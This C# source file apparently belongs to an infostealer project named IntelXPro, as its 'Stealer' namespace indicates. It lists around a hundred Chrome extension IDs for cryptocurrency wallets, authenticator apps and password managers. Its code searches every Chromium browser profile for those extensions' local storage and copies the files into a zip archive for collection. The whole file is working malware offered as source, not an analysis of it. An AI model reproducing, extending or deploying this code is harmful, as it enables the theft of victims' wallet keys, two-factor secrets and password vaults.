using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

using IntelXPro.src.IntelXPro.Dependencies.Data;

namespace IntelXPro.src.IntelXPro.Stealer.Browsers.Extentions
{
    internal class CryptoChromium : ITarget
    {
        private readonly List<string[]> ChromeWalletsDirectories = new List<string[]>
    {
        new string[2] { "Trust Wallets", "pknlccmneadmjbkollckpblgaaabameg" },
        new string[2] { "MetaWallet", "pfknkoocfefiocadajpngdknmkjgakdg" },
        new string[2] { "Guarda Wallet", "fcglfhcjfpkgdppjbglknafgfffkelnm" },
        new string[2] { "Exodus", "idkppnahnmmggbmfkjhiakkbkdpnmnon" },
        new string[2] { "JaxxxLiberty", "mhonjhhcgphdphdjcdoeodfdliikapmj" },
        new string[2] { "Atomic Wallet", "bhmlbgebokamljgnceonbncdofmmkedg" },
        new string[2] { "Mycelium", "pidhddgciaponoajdngciiemcflpnnbg" },
        new string[2] { "Coinomi", "blbpgcogcoohhngdjafgpoagcilicpjh" },
        new string[2] { "GreenAddress", "gflpckpfdgcagnbdfafmibcmkadnlhpj" },
        new string[2] { "Edge", "doljkehcfhidippihgakcihcmnknlphh" },
        new string[2] { "BRD", "nbokbjkelpmlgflobbohapifnnenbjlh" },
        new string[2] { "Samourai Wallet", "apjdnokplgcjkejimjdfjnhmjlbpgkdi" },
        new string[2] { "Copay", "ieedgmmkpkbiblijbbldefkomatsuahh" },
        new string[2] { "Bread", "jifanbgejlbcmhbbdbnfbfnlmbomjedj" },
        new string[2] { "KeepKey", "dojmlmceifkfgkgeejemfciibjehhdcl" },
        new string[2] { "Trezor", "jpxupxjxheguvfyhfhahqvxvyqthiryh" },
        new string[2] { "Ledger Live", "pfkcfdjnlfjcmkjnhcbfhfkkoflnhjln" },
        new string[2] { "Ledger Wallet", "hbpfjlflhnmkddbjdchbbifhllgmmhnm" },
        new string[2] { "Bitbox", "ocmfilhakdbncmojmlbagpkjfbmeinbd" },
        new string[2] { "Digital Bitbox", "dbhklojmlkgmpihhdooibnmidfpeaing" },
        new string[2] { "YubiKey", "mammpjaaoinfelloncbbpomjcihbkmmc" },
        new string[2] { "Nifty Wallet", "jbdaocneiiinmjbjlgalhcelgbejmnid" },
        new string[2] { "Math Wallet", "afbcbjpbpfadlkmhmclhkeeodmamcflc" },
        new string[2] { "Coinbase Wallet", "hnfanknocfeofbddgcijnmhnfnkdnaad" },
        new string[2] { "Equal Wallet", "blnieiiffboillknjnepogjhkgnoac" },
        new string[2] { "EVER Wallet", "cgeeodpfagjceefieflmdfphplkenlfk" },
        new string[2] { "Jaxx Liberty", "ocefimbphcgjaahbclemolcmkeanoagc" },
        new string[2] { "BitApp Wallet", "fihkakfobkmkjojpchpfgcmhfjnmnfpi" },
        new string[2] { "Mew CX", "nlbmnnijcnlegkjjpcfjclmcfggfefdm" },
        new string[2] { "GU Wallet", "nfinomegcaccbhchhgflladpfbajihdf" },
        new string[2] { "Guild Wallet", "nanjmdkhkinifnkgdeggcnhdaammmj" },
        new string[2] { "Saturn Wallet", "nkddgncdjgifcddamgcmfnlhccnimig" },
        new string[2] { "Harmony Wallet", "fnnegphlobjdpkhecapkijjdkgcjhkib" },
        new string[2] { "TON Wallet", "nphplpgoakhhjchkkhmiggakijnkhfnd" },
        new string[2] { "OpenMask Wallet", "penjlddjkjgpnkllboccdgccekpkcbin" },
        new string[2] { "MyTonWallet", "fldfpgipfncgndfolcbkdeeknbbbnhcc" },
        new string[2] { "DeWallet", "pnccjgokhbnggghddhahcnaopgeipafg" },
        new string[2] { "TrustWallet", "egjidjbpglichdcondbcbdnbeeppgdph" },
        new string[2] { "NC Wallet", "imlcamfeniaidioeflifonfjeeppblda" },
        new string[2] { "Moso Wallet", "ajkifnllfhikkjbjopkhmjoieikeihjb" },
        new string[2] { "Enkrypt Wallet", "kkpllkodjeloidieedojogacfhpaihoh" },
        new string[2] { "CirusWeb3 Wallet", "kgdijkcfiglijhaglibaidbipiejjfdp" },
        new string[2] { "Martian and Sui Wallet", "efbglgofoippbgcjepnhiblaibcnclgk" },
        new string[2] { "SubWallet", "onhogfjeacnfoofkfgppdlbmlmnplgbn" },
        new string[2] { "Pontem Wallet", "phkbamefinggmakgklpkljjmgibohnba" },
        new string[2] { "Talisman Wallet", "fijngjgcjhjmmpcmkeiomlglpeiijkld" },
        new string[2] { "Kardiachain Wallet", "pdadjkfkgcafgbceimcpbkalnfnepbnk" },
        new string[2] { "Phantom Wallet", "bfnaelmomeimhipmgjnjophhpkkoljpa" },
        new string[2] { "Phantom Wallet", "bfnaelmomeimhlpmgjnjophhpkkoljpa" },
        new string[2] { "Oxygen Wallet", "fhilaheimglignddjgofkcbgekhenbh" },
        new string[2] { "PaliWallet", "mgfffbidihjpoaomajlbgchddlicgpn" },
        new string[2] { "BoltX Wallet", "aodkkagnadcbobfpggnjeongemjbjca" },
        new string[2] { "Liquality Wallet", "kpopkelmapcoipemfendmdghnegimn" },
        new string[2] { "xDefi Wallet", "hmeobnffcmdkdcmlb1gagmfpfboieaf" },
        new string[2] { "Nami Wallet", "ipfcbjknijpeeillifnkikgncikgfhdo" },
        new string[2] { "MaiarDeFi Wallet", "dngmlblcodfobpdpecaadgfbeggfjfnm" },
        new string[2] { "MetaMask Wallet", "nkbihfbeogaeaoehlefnkodbefgpgknn" },
        new string[2] { "MetaMask Wallet", "djclckkglechooblngghdinmeemkbgci" },
        new string[2] { "MetaMask Wallet", "ejbalbakoplchlghecdalmeeeajnimhm" },
        new string[2] { "Goblin Wallet", "mlbafbjadjidk1bhgopoamemfibcpdfi" },
        new string[2] { "Braavos Smart Wallet", "jnlgamecbpmbajjfhmmmlhejkemejdma" },
        new string[2] { "UniSat Wallet", "ppbibelpcjmhbdihakflkdcoccbgbkpo" },
        new string[2] { "OKX Wallet", "mcohilncbfahbmgdjkbpemcciiolgcge" },
        new string[2] { "Manta Wallet", "enabgbdfcbaehmbigakijjabdpdnimlg" },
        new string[2] { "Suku Wallet", "fopmedgnkfpebgllppeddmmochcookhc" },
        new string[2] { "Suiet Wallet", "khpkpbbcccdmmclmpigdgddabeilkdpd" },
        new string[2] { "Koala Wallet", "lnnnmfcpbkafcpgdilckhmhbkkbpkmid" },
        new string[2] { "ExodusWeb3 Wallet", "aholpfdialjgjfhomihkjbmgjidlcdno" },
        new string[2] { "Aurox Wallet", "kilnpioakcdndlodeeceffgjdpojajlo" },
        new string[2] { "Fewcha Move Wallet", "ebfidpplhabeedpnhjnobghokpiioolj" },
        new string[2] { "Carax Demon Wallet", "mdjmfdffdcmnoblignmgpommbefadffd" },
        new string[2] { "Leap Terra Wallet", "aijcbedoijmgnlmjeegjaglmepbmpkpi" },
        new string[2] { "Keplr Wallet", "dmkamcknogkgcdfhhbddcghachkejeap" },
        new string[2] { "Binance Chain Wallet", "fhbohimaelbohpjbbldcngcnapndodjp" },
        new string[2] { "Yoroi Wallet", "ffnbelfdoeiohenkjibnmadjiehjhajb" },
        new string[2] { "Rabby Wallet", "acmacodkjbdgmoleebolmdjonilkdbch" },
        new string[2] { "TokenPocket", "mfgccjchihfkkindfppnaooecgfneiii" },
        new string[2] { "SafePal Extension Wallet", "lgmpcpglpngdoalbgeoldeajfclnhafa" },
        new string[2] { "Magic Eden Wallet", "mkpegjkblkkefacfnmkajcjmabijhclg" },
        new string[2] { "Ronin", "fnjhmkhhmkbjkkabndcnnogagogbneec" },
        new string[2] { "Coin98", "aeachknmefphepccionboohckonoeemg" },
        new string[2] { "TerraStation", "aiifbnbfobpmeekipheeijimdpnlpgpp" },
        new string[2] { "Wombat", "amkmjjmmflddogmhpjloimipbofnfjih" },
        new string[2] { "Nami", "lpfcbjknijpeeillifnkikgncikgfhdo" },
        new string[2] { "XDEFI", "hmeobnfnfcmdkdcmlblgagmfpfboieaf" },
        new string[2] { "Tron", "ibnejdfjmmkpcnlpebklmnkoeoihofec" },
        new string[2] { "Authenticator", "bhghoamapcdpbohphigoooaddinpkbai" },
        new string[2] { "Google Authenticator", "khcodhlfkpmhibicdjjblnkgimdepgnd" },
        new string[2] { "Microsoft Authenticator", "bfbdnbpibgndpjfhonkflpkijfapmomn" },
        new string[2] { "Authy", "gjffdbjndmcafeoehgdldobgjmlepcal" },
        new string[2] { "Duo Mobile", "eidlicjlkaiefdbgmdepmmicpbggmhoj" },
        new string[2] { "OTP Auth", "bobfejfdlhnabgglompioclndjejolch" },
        new string[2] { "FreeOTP", "elokfmmmjbadpgdjmgglocapdckdcpkn" },
        new string[2] { "Aegis Authenticator", "ppdjlkfkedmidmclhakfncpfdmdgmjpm" },
        new string[2] { "LastPass Authenticator", "cfoajccjibkjhbdjnpkbananbejpkkjb" },
        new string[2] { "Dashlane", "flikjlpgnpcjdienoojmgliechmmheek" },
        new string[2] { "Keeper", "gofhklgdnbnpcdigdgkgfobhhghjmmkj" },
        new string[2] { "RoboForm", "hppmchachflomkejbhofobganapojjol" },
        new string[2] { "KeePass", "lbfeahdfdkibininjgejjgpdafeopflb" },
        new string[2] { "KeePassXC", "kgeohlebpjgcfiidfhhdlnnkhefajmca" },
        new string[2] { "Bitwarden", "inljaljiffkdgmlndjkdiepghpolcpki" },
        new string[2] { "NordPass", "njgnlkhcjgmjfnfahdmfkalpjcneebpl" },
        new string[2] { "LastPass", "gabedfkgnbglfbnplfpjddgfnbibkmbb" }
    };

        public void Collect(InMemoryZip zip, Counter counter)
        {
            Parallel.ForEach(Paths.Chromium, delegate (string browser)
            {
                if (Directory.Exists(browser))
                {
                    Parallel.ForEach(Directory.GetDirectories(browser), delegate (string profile)
                    {
                        string browsername = Paths.GetBrowserName(browser);
                        string profilename = Path.GetFileName(profile);
                        Task.Run(delegate
                        {
                            GetChromeWallets(zip, counter, profile, profilename, browsername);
                        });
                    });
                }
            });
        }

        private void GetChromeWallets(InMemoryZip zip, Counter counter, string profilePath, string profilename, string browserName)
        {
            string path = Path.Combine(profilePath, "Local Extension Settings");
            if (!Directory.Exists(path))
            {
                return;
            }
            Dictionary<string, string> extensionDirs = Directory.EnumerateDirectories(path).ToDictionary((string dir) => Path.GetFileName(dir).ToLowerInvariant(), (string dir) => dir);
            Parallel.ForEach(ChromeWalletsDirectories, delegate (string[] walletInfo)
            {
                string key = walletInfo[1];
                if (extensionDirs.TryGetValue(key, out var value))
                {
                    zip.AddDirectoryFiles(value, browserName + "_" + profilename + " " + walletInfo[0]);
                    counter.CryptoChromium.Add(value + " => " + browserName + "_" + profilename + " " + walletInfo[0]);
                }
            });
        }
    }
}
